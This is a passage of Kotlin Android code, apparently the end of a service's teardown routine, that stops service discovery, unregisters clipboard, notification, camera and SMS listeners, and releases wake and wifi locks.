        try {
            nsdManager?.stopServiceDiscovery(discoveryListener)
        } catch (e: Exception) {
            // Ignore
        }
        try {
            clipboardListener?.let { clipboardManager?.removePrimaryClipChangedListener(it) }
        } catch (e: Exception) {
            // Ignore
        }
        try {
            notificationReceiver?.let { unregisterReceiver(it) }
        } catch (e: Exception) {
            // Ignore
        }
        try {
            cameraReceiver?.let { unregisterReceiver(it) }
        } catch (e: Exception) {
            // Ignore
        }
        try {
            smsReceiver?.let { unregisterReceiver(it) }
        } catch (e: Exception) {
            // Ignore
        }
        
        try {
            if (wakeLock?.isHeld == true) wakeLock?.release()
            if (wifiLock?.isHeld == true) wifiLock?.release()
        } catch (e: Exception) {
            // Ignore
        }
    }
}
